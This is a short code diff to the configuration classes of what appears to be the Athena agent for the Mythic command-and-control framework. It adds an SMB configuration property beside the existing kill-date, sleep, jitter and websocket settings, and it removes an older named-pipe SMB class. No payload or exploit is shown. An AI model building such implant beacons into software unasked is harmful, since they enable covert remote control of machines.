@@ -17,6 +17,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
+        public SMBConfig smbConfig { get; set; }
 
         public MythicConfig()
         {
@@ -34,6 +35,7 @@ namespace Athena.Config
             int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
             this.currentConfig = new Websocket(this.uuid);
+            this.smbConfig = new SMBConfig();
         }
     }
 
@@ -167,11 +169,5 @@ namespace Athena.Config
             public string Data { get; set; }
             public string Tag { get; set; }
         }
-    }
-
-    public class SMB
-    {
-        public string namedpipe { get; set; }
-        public List<string> messages { get; set; }
     }
 }
